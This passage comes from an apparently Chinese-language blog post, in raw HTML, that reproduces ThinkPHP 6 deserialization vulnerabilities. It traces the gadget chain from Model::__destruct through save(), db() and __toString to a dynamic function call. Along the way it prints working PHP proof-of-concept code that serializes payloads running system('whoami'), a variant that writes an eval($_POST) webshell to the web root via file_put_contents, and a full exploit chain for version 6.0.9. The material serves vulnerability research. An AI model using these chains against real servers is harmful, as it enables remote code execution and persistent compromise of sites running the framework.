    <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"key"</span><span class="token operator">=></span><span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"key"</span><span class="token operator">=></span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span>
<span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Model</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">use</span> <span class="token package">model<span class="token punctuation">\</span>concern<span class="token punctuation">\</span>Attribute</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$lazySave</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$withEvent</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$force</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">=</span><span class="token variable">$obj</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span>
<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>访问<code>http://tp6/public/index.php/Index/test</code>传入payload即可</p>
<h3 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h3><p>直接下断点</p>
<p>TP5的反序列化链入口都是Windows类的__destruct，但是在TP6中把这个类移除了，那么这里利用的是<code>Model::__destruct</code>方法</p>
<p>跟到反序列化的入口<code>__destruct</code>方法</p>
<p>在 &#x2F;vendor&#x2F;topthink&#x2F;think-orm&#x2F;src&#x2F;Model.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lazySave</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240314003005244.png" alt="image-20240314003005244"></p>
<p>lazySave可控，只需要为true即可，对应poc中的</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">private</span> <span class="token variable">$lazySave</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>继续跟进<code>save</code>方法</p>
<p>因为这里没有传入参数，所以<code>$this-&gt;setAttrs($data);</code>中什么都没执行</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240314003333911.png" alt="image-20240314003333911"></p>
<p>然后看一下接下来的if语句中的方法</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">trigger</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$event</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">withEvent</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>要绕过的话需要让<code>$this-&gt;data</code>有值，<code>$this-&gt;withEvent</code>为false</p>
<p>即poc中的<code>protected $withEvent = false;</code></p>
<p>然后来到<code>updateData()</code>方法</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240314004413066.png" alt="image-20240314004413066"></p>
<p>第一个if还是进行了<code>trigger()</code>判断，跟前边那个一样，可以直接绕过</p>
<p><code>checkData()</code>也没执行任何东西</p>
<p>接着跟进<code>$data = $this-&gt;getChangedData();</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getChangedData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">array</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">force</span> <span class="token operator">?</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token punctuation">:</span> <span class="token function">array_udiff_assoc</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">origin</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$a</span> <span class="token operator">!==</span> <span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">return</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token variable">$b</span> <span class="token operator">?</span> <span class="token number">1</span> <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// 只读字段不允许更新</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">readonly</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$field</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token variable">$field</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$field</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>控制<code>$this-&gt;force</code>的值即可将我们传入的<code>$this-&gt;data</code>的值给$data，即<code>private $data = [&quot;key&quot;=&gt;&quot;whoami&quot;];</code></p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240314004621977.png" alt="image-20240314004621977"></p>
<p>返回data后，接着进入下边的<code>checkAllowFields()</code>方法</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240314004847525.png" alt="image-20240314004847525"></p>
<p>跟进到<code>db()</code>方法</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240314005034399.png" alt="image-20240314005034399"></p>
<p>可以发现里面有<code>.</code>号，说明当我们<strong>构造对象进行字符串拼接</strong>时，就可以触发<code>__toString()</code> 魔术方法</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240315005048049.png" alt="image-20240315005048049"></p>
<p>此时<code>$this-&gt;name</code>是 Pivot 类对象，可以触发<code>__toString</code></p>
<p>前半段链子总结：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> ——<span class="token operator">></span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> ——<span class="token operator">></span> <span class="token function">updateData</span><span class="token punctuation">(</span><span class="token punctuation">)</span> ——<span class="token operator">></span> <span class="token function">checkAllowFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span> ——<span class="token operator">></span> <span class="token function">db</span><span class="token punctuation">(</span><span class="token punctuation">)</span> ——<span class="token operator">></span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">table</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">suffix</span>（字符串拼接）——<span class="token operator">></span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>所以我们的poc要构造：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">private</span> <span class="token variable">$lazySave</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
<span class="token keyword">protected</span> <span class="token variable">$withEvent</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
<span class="token keyword">private</span> <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>既然触发了<code>__toString</code>，接下来就和tp5.1的链子差不多了，这里用的是<code>withAttr</code>的链子（搞到这里才发现自己的think-orm版本用错了，导致后面动态执行函数前新增了一个判断无法rce）</p>
<p>首先是经典的<code>__toString -&gt; __toJson -&gt; toArray()</code></p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240315011430244.png" alt="image-20240315011430244"></p>
<p>这里要进入关键的<code>getAttr</code>方法</p>
<p>首先是字符串检测，只要<code>$this-&gt;visible</code>数组对应的值不是字符串即可，这里是空值</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240315012648662.png" alt="image-20240315012648662"></p>
<p>然后就进 vendor&#x2F;topthink&#x2F;think-orm&#x2F;src&#x2F;model&#x2F;concern&#x2F;Attribute.php 的<code>getAttr</code>了</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240315011544879.png" alt="image-20240315011544879"></p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240315011636284.png" alt="image-20240315011636284"></p>
<p>然后跟到<code>getData</code>方法</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getData</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token variable">$fieldName</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getRealFieldName</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token variable">$fieldName</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token variable">$fieldName</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token variable">$fieldName</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">relation</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">relation</span><span class="token punctuation">[</span><span class="token variable">$fieldName</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidArgumentException</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'property not exists:'</span> <span class="token operator">.</span> <span class="token keyword static-context">static</span><span class="token operator">::</span><span class="token keyword">class</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'->'</span> <span class="token operator">.</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>getRealFieldName</code>方法</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">getRealFieldName</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">strict</span> <span class="token operator">?</span> <span class="token variable">$name</span> <span class="token punctuation">:</span> <span class="token class-name static-context">Str</span><span class="token operator">::</span><span class="token function">snake</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>跟一圈下来发现返回了原值，接下来调用<code>getValue</code></p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240315010825471.png" alt="image-20240315010825471"></p>
<p>这里会动态调用函数，于是实现rce（think-orm的版本会决定此处是否成功）</p>
<h3 id="关于最后-getData-和-getRealFieldName-的补充"><a href="#关于最后-getData-和-getRealFieldName-的补充" class="headerlink" title="关于最后 getData 和 getRealFieldName 的补充"></a>关于最后 getData 和 getRealFieldName 的补充</h3><p>参考：<a target="_blank" rel="noopener" href="https://quick-mascara-699.notion.site/2024SCTF-wp-d34600322f1141e680e837abce5795ef#5ed65377b6594667b69f467f695a3b30">https://quick-mascara-699.notion.site/2024SCTF-wp-d34600322f1141e680e837abce5795ef#5ed65377b6594667b69f467f695a3b30</a></p>
<p>我们的目的是控制 <code>$closure($value, $this-&gt;data);</code>，但是实际上 <code>$value=this-&gt;data</code> 我们在获取value时走到第一个判断就返回<code>$this-&gt;data</code>的值了</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20241013160657201.png" alt="image-20241013160657201"></p>
<p>相当于向system传入两个一模一样的参数</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20241013161240679.png" alt="image-20241013161240679"></p>
<p>这样是可以执行的，原因在于system接受一个可选参数作为返回值存储</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20241013161334183.png" alt="image-20241013161334183"></p>
<p>而如果我们想要分别控制两个参数的话，因为<code>$value</code> 的值是由 <code>getData()</code> 获取</p>
<p>而 getRealFieldName 中，当 strict 属性为 false 时，会触发 Snake 驼峰命名转化机制，让key值实现不同的转换</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20241013162211399.png" alt="image-20241013162211399"></p>
<p>从而实现 进入判断2 返回relation中的值，于是就能单独控制参数了</p>
<p>poc就是多一个参数的事</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">private $data = ["key"=>"<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span>\<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>"];
private $withAttr = ["key"=>"file_put_contents"];
private $relation = ["key" => "/var/www/public/myshell.php"];<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<hr>
<h2 id="6-0-9反序列化"><a href="#6-0-9反序列化" class="headerlink" title="6.0.9反序列化"></a>6.0.9反序列化</h2><p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10644">https://xz.aliyun.com/t/10644</a></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">namespace</span> <span class="token package">think</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>route<span class="token punctuation">\</span>Url</span><span class="token punctuation">;</span>

    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Model</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">private</span> <span class="token variable">$lazySave</span><span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token variable">$exists</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$withEvent</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$table</span><span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token variable">$force</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lazySave</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">withEvent</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">exists</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">table</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Url</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">force</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>

    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>route</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Middleware</span><span class="token punctuation">;</span>
    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Validate</span><span class="token punctuation">;</span>

    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Url</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">protected</span> <span class="token variable">$url</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$domain</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$app</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$route</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">url</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'a:'</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">domain</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;?php system('whoami');?>"</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">app</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Middleware</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">route</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Validate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>view<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Php</span><span class="token punctuation">;</span>

    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Validate</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">type</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'getDomainBind'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Php</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'display'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Middleware</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">request</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"2333"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>view<span class="token punctuation">\</span>driver</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Php</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<hr>
